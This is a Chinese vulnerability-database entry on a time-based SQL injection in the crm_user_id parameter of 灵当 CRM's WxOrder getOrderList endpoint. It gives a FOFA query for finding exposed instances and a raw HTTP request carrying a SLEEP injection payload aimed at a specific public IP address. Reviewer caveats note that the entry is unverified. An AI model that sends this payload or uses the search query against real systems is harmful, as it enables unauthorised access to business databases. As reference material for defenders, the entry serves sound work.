---
source: "wy876 漏洞文库"
title: "灵当CRM WxOrder getOrderList crm_user_id SQL注入"
product: "灵当CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "MySQL，版本未知"
prerequisites: "Accept-Ldwk头语义未说明，无Cookie"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/kuce46edah7b3gg3"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%81%B5%E5%BD%93%E4%BA%92%E5%8A%A8%E4%BF%A1%E6%81%AF/%E7%81%B5%E5%BD%93crmgetOrderList%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "body="
id: "vw-1c5145ccf881e522ac7d4ccc"
entity_id: "ve-1c5145ccf881e522ac7d4ccc"
schema_version: "1"
---

# 灵当CRM WxOrder getOrderList crm_user_id SQL注入

## 条目说明

- 对象与具体问题：灵当CRM；WxOrder getOrderList crm_user_id SQL注入
- 版本、配置及部署条件：MySQL，版本未知
- 认证与权限前提：Accept-Ldwk头语义未说明，无Cookie
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 1秒等待无计时结果，注入ID11而基准ID1导致数据差异干扰，应同基值对照
- 实际路由WeiXinApp/marketing与query操作应完整索引；缺源码/修复
- 不能把任意crm_user_id直接认无授权或成功注入

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
灵当CRM（Customer Relationship Management，客户关系管理）是一款面向中小企业的客户关系管理软件，旨在帮助企业更好地管理客户信息、销售流程、市场营销和服务支持等方面的工作。灵当CRM提供了一系列工具和功能，帮助企业在销售、市场和服务部门之间实现高效协作，提高客户满意度和业务效率。灵当CRM客户管理系getOrderList存在SQL注入漏洞。

## 二、影响版本
+ 灵当crm

## 三、资产测绘
+ fofa`body="[http://localhost:8088/crm/index.php"](http://localhost:8088/crm/index.php") && body="ldcrm.base.js"` `body="crmcommon/js/jquery/jquery-1.10.1.min.js"`
+ 特征


## 四、漏洞复现
```http
GET /crm/WeiXinApp/marketing/index.php?module=WxOrder&action=getOrderList&crm_user_id=11%20AND%20(SELECT%209552%20FROM%20(SELECT(SLEEP(1)))fiAG) HTTP/1.1
Host: 120.79.185.144:85
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Ldwk: bG91ZG9uZ3dlbmt1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```


```http
GET /crm/WeiXinApp/marketing/index.php?module=WxOrder&action=getOrderList&crm_user_id=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Ldwk: bG91ZG9uZ3dlbmt1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kuce46edah7b3gg3>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
